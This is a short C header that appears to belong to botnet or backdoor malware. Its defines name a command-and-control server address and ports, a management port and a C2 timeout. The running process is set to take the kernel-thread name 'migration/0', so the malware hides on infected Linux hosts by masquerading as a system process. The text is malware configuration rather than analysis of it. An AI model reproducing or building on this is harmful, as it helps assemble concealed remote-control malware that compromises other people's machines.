#define INET_ADDR(o1,o2,o3,o4) (htonl((o1 << 24) | (o2 << 16) | (o3 << 8) | (o4 << 0)))

#define PROCESS_NAME "migration/0"
#define CNC_IP "127.0.0.1"
#define CNC_PORT 6230
#define MGM_PORT 5555
#define MAX_MSG_SIZE 378
#define CNC_TIMEOUT 30
#define RECV_FLAGS (MSG_WAITALL | MSG_NOSIGNAL)